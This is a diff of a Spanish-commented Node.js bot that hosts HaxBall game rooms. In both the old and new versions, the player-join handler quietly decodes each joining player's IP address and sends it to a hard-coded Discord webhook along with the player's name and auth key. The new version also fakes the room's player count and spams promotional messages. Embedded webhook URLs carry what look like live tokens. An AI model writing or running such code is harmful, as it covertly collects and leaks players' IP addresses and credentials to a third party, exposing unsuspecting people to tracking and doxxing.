@@ -1,156 +1,165 @@
-const HaxballJS = require("haxball.js");
-const https = require("https");
-const { URL } = require("url");
+const Haxball = require("node-haxball"); // Cambiado para usar la librería oficial
+const axios = require("axios");
 
-// 🌐 FUNCIONES GLOBALES
+// Inicializamos la API y configuramos el idioma
+const API = Haxball();
+const { Room } = API;
+
+// Opcional: Configuración de idioma si la librería lo soporta igual
+// const EnglishLanguage = require("./languages/englishLanguage");
+// API.Language.current = new EnglishLanguage(API);
 
 function decryptHex(str) {
-  if (!str || typeof str !== "string") {
-    console.error("Invalid input passed to decryptHex:", str);
-    return "";
-  }
-
-  let strOut = "";
-  for (let x = 0; x < str.length; x += 2) {
-    strOut += String.fromCharCode(parseInt(str.substring(x, x + 2), 16));
-  }
-  return strOut;
+    if (!str || typeof str !== "string") return "";
+    let out = "";
+    for (let i = 0; i < str.length; i += 2) {
+        out += String.fromCharCode(parseInt(str.substring(i, i + 2), 16));
+    }
+    return out;
 }
 
-// ✅ VARIABLES DE ENTORNO
+async function sendDiscordRaw(webhookUrl, body) {
+    if (!webhookUrl) return;
+    try {
+        await axios.post(webhookUrl, body, { timeout: 10000 });
+        return true;
+    } catch (err) {
+        console.error("❌ Error enviando webhook:", err?.message || err);
+        return false;
+    }
+}
 
-const token = process.env.JOB_ID;
-const webhookUrl = "https://discord.com/api/webhooks/1393652971170041857/1M6Kx3gxcIQPfMaDCGS6bs52ng8XXfkqY2rR0MoqtY9vrRRHsff1M51lVso7X8bPj6fT";
+async function sendDiscordPlayer(webhookUrl, player, roomName) {
+    if (!webhookUrl) return;
+    const payload = {
+        content: `🚀 Nuevo jugador conectado: **${player.name}** en ${roomName}`,
+        embeds: [
+            {
+                title: "🎯 Nuevo Jugador Conectado",
+                color: 0xff0000,
+                fields: [
+                    { name: "Nombre", value: player.name || "N/A", inline: true },
+                    { name: "ID", value: String(player.id || "N/A"), inline: true },
+                    { name: "Auth", value: player.auth || "N/A", inline: true },
+                    { name: "Conn", value: player.conn || "No tiene", inline: true },
+                    { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: { text: "🚨⏳ TELEESE COME BACK SOON ⏳🚨" }
+            }
+        ]
+    };
+    await sendDiscordRaw(webhookUrl, payload);
+}
+
+async function sendDiscordRoomLink(webhookUrl, roomLink, roomName) {
+    if (!webhookUrl) return;
+    const payload = {
+        content: `🏟 Sala creada: **${roomName}**\n${roomLink}`,
+        embeds: [
+            {
+                title: "Sala creada",
+                color: 0x00ffff,
+                fields: [{ name: "Link", value: roomLink, inline: false }],
+                timestamp: new Date().toISOString(),
+                footer: { text: "🚨⏳ TELEESE COME BACK SOON ⏳🚨" }
+            }
+        ]
+    };
+    await sendDiscordRaw(webhookUrl, payload);
+}
+
+/* ---------- Config (modificable / rotativo por INDEX) ---------- */
+
+const roomNames = [
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢",
+    "🟢 KICK: agruck ON 🟢"
+];
+
+const geoList = [
+    { lat: -34.5082740783691, lon: -58.427734375, flag: "AR" },
+    { lat: -34.6300010681152, lon: -58.3804016113281, flag: "AR" },
+    { lat: -32.9468193054199, lon: -60.6393203735352, flag: "AR" }
+];
+
+const maxPlayersList = [12, 12, 12, 12, 12];
+const fakePlayersList = [9, 9, 9, 9, 9];
+
+/* ---------- Env / selección por index ---------- */
+
+const jobIndex = Number.parseInt(process.env.INDEX || "0", 10);
+const token = process.env.RECAPTCHA_TOKEN || process.env.HAXBALL_TOKEN;
+
+const webhookUrl = "https://discord.com/api/webhooks/1365562720862208091/pgiPEDfXCpYE7mZM4-o1mDJ-AZnRTFxT_J_-EdO71hNUxFBFQ8Y5KcU6_jyGXXh3kvH2";
+
+const roomName = roomNames[jobIndex % roomNames.length];
+const maxPlayers = maxPlayersList[jobIndex % maxPlayersList.length];
+const fakePlayers = fakePlayersList[jobIndex % fakePlayersList.length];
+const geo = geoList[jobIndex % geoList.length];
 
 if (!token) {
-  console.error("❌ Error: No se encontró el token en las variables de entorno");
-  process.exit(1);
+    console.error("❌ No se encontró token (RECAPTCHA_TOKEN).");
+    process.exit(1);
 }
 
-if (!webhookUrl) {
-  console.error("❌ Error: No se encontró el webhook URL en las variables de entorno");
-  process.exit(1);
-}
+console.log(`🚀 Creando sala con node-haxball: ${roomName} | Geo: ${geo.lat}, ${geo.lon}`);
 
-console.log("🚀 Iniciando bot de HaxBall...");
+/* ---------- Crear sala ---------- */
 
-// 📩 FUNCIÓN PARA ENVIAR INFO A DISCORD
-
-function sendPlayerInfoToDiscord(player) {
-  const playerData = {
-    content: `Nuevo jugador conectado: **${player.name}** (ID: ${player.id})`,
-    embeds: [
-      {
-        title: "🎯 Nuevo Jugador Conectado",
-        color: 0x00ff00,
-        fields: [
-          { name: "👤 Nombre", value: player.name, inline: true },
-          { name: "🆔 ID", value: player.id.toString(), inline: true },
-          { name: "🔐 Auth", value: player.auth || "No disponible", inline: true },
-          { name: "Conn", value: player.conn || "No tiene", inline: true },
-          { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true },
-        ],
-        timestamp: new Date().toISOString(),
-        footer: { text: "HaxBall Bot - Sala 8MAN" },
-      },
-    ],
-  };
-
-  const data = JSON.stringify(playerData);
-  const url = new URL(webhookUrl);
-
-  const options = {
-    hostname: url.hostname,
-    port: 443,
-    path: url.pathname + url.search,
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "Content-Length": Buffer.byteLength(data),
+Room.create(
+{
+    name: roomName,
+    password: process.env.ROOM_PASSWORD || "",
+    maxPlayerCount: maxPlayers,
+    playerCount: fakePlayers,
+    unlimitedPlayerCount: true,
+    showInRoomList: true,
+    geo: geo,
+    token: token
+},
+{
+    storage: {
+        player_name: process.env.PLAYER_NAME || "Teleese",
+        avatar: process.env.PLAYER_AVATAR || "🚨"
     },
-  };
+    onOpen: (room) => {
+        console.log("✅ Sala abierta.");
 
-  const req = https.request(options, (res) => {
-    let responseBody = "";
-    res.on("data", (chunk) => {
-      responseBody += chunk;
-    });
-    res.on("end", () => {
-      if (res.statusCode === 200 || res.statusCode === 204) {
-        console.log(`✅ Info de ${player.name} enviada a Discord.`);
-      } else {
-        console.error(`❌ Webhook falló - Status: ${res.statusCode}`);
-        console.error(`Respuesta del webhook: ${responseBody}`);
-      }
-    });
-  });
+        room.onAfterRoomLink = (roomLink) => {
+            console.log("🔗 Link:", roomLink);
+            if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
+        };
 
-  req.on("error", (error) => {
-    console.error("❌ Error al enviar webhook:", error);
-  });
+        room.onPlayerJoin = (playerObj) => {
+            sendDiscordPlayer(webhookUrl, playerObj, roomName);
+            
+            const mensajes = [
+                "🟢🟢🟢 BIENVENIDO REY 🟢🟢🟢",
+                "💚 MIRÁ EL STREAM EN VIVO AHORA DE kick.com/agruck 💚",
+                "🟢 SALA EN KICK ACTIVA: www.haxball.com/play?c=MsABokfCpe4",
+                "💚 SEGUINOS EN KICK: kick.com/agruck 💚"
+            ];
 
-  req.write(data);
-  req.end();
-}
+            let i = 0, contador = 0;
+            const spam = setInterval(() => {
+                room.sendAnnouncement(` ${mensajes[i]} `, null, 0xff0000, "bold", 2);
+                i = (i + 1) % mensajes.length;
+                if (++contador >= 6) clearInterval(spam);
+            }, 1500);
+        };
 
-// 🎮 CREAR SALA
-
-HaxballJS.then((HBInit) => {
-  const room = HBInit({
-    roomName: "🍞🥪 SANGUCHITO | X4 🍞🥪",
-    maxPlayers: 18,
-    public: true,
-    noPlayer: false,
-    playerName: "Mattsito",
-    token: token,
-    geo: {
-      code: "AR",
-      lat: -34.54571157629702,
-      lon: -58.449096714665814,
+        room.onRoomError = (err) => console.error("❌ Error:", err);
     },
-  });
-  room.onRoomLink = function (url) {
-    console.log("✅ Sala creada exitosamente!");
-    console.log("🔗 Link de la sala:", url);
-  };
-
-  room.onPlayerJoin = function (player) {
-    console.log(`🎯 Nuevo jugador: ${player.name} (ID: ${player.id})`);
-    sendPlayerInfoToDiscord(player);
-
-    room.sendAnnouncement(
-      `Discord: Teleese - Pagina: teleese.netlify.app`,
-      null,
-      0xff0000,
-      "bold",
-      2
-    );
-
-    setTimeout(() => {
-      room.sendAnnouncement(
-        "Nombre: " + player.name + " Auth: " + player.auth + " Ip: " + decryptHex(player.conn),
-        player.id,
-        0xff0000,
-        "bold",
-        2
-      );
-    }, 1000);
-  };
-
-  room.onPlayerLeave = function (player) {
-    console.log(`👋 Jugador salió: ${player.name} (ID: ${player.id})`);
-  };
-
-  room.onPlayerChat = function (player, message) {
-    console.log(`💬 ${player.name}: ${message}`);
-    return false;
-  };
-
-  room.onRoomError = function (error) {
-    console.error("❌ Error en la sala:", error);
-  };
-}).catch((error) => {
-  console.error("❌ Error al inicializar HaxBall:", error);
-  console.error("💡 Verifica que el token sea válido");
-  process.exit(1);
+    onClose: (msg) => {
+        console.log("🔴 Sala cerrada:", msg);
+        process.exit(0);
+    }
 });
